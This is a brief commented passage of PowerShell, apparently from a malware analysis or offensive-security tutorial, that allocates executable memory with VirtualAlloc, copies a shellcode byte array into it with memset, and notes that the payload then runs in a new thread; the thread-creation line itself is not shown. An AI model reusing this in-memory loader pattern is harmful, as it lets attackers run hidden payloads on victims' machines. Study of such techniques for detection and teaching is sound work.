...
# allocating a block of memory using VirtualAlloc

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

# take each byte of the payload stored in the $sc byte array and write it to newly-allocated memory block using memset

for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};

# in-memory written payload is executed in a separate thread using the CreateThread API
